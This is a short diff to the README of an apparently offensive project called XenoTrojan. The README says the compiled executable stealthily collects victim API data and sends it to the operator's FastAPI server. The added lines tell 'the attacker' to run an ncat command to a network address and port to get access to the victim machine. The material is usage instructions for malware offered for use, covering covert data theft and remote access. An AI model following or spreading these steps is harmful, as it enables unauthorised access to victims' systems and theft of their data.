@@ -119,6 +119,11 @@ Run the compiled XenoTrojan ELF executable:
 ```
 ![alt text](img/cli.png)
 
+Then the attacker run this command to get access:
+```bash
+PS C:\Users\user> ncat 192.168.1.36 3993
+
+```
 
 XenoTrojan will stealthily collect victim API data and transmit it securely to your FastAPI server.
 
